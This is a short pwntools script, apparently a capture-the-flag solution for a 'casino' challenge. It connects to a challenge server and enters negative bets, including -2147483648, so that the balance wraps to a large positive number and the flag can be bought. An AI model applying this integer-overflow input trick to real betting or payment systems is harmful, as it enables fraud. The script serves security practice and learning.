from pwn import *

elf = context.binary = ELF('../src/bin/casino')

local = False

if not local:
    io = remote('challs.sieberr.live', 1002)
else:
    io = elf.process(stdin=PTY)


# gamble $-1000
io.sendline(b'1')
io.sendline(b'-1000')
io.sendline(b'2')
# balance = $-900

# gamble $-2147483648
io.sendline(b'1')
io.sendline(b'-2147483648')
io.sendline(b'2')
# balance = $2147482748

# buy flag
io.sendline(b'2')
io.interactive()
